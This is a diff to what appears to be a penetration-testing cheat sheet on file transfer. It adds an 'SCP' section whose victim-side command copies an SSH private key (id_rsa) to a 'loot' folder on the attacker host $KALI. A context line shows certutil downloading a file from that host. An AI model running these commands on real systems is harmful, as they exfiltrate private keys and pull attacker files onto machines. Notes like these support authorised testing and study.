@@ -83,3 +83,13 @@ certutil -urlcache -f http://$KALI:82/$FILE $FILE
 
 
 
+## SCP
+
+### Download File
+
+**Victim**
+
+```
+scp id_rsa root@$KALI:/root/loot
+```
+
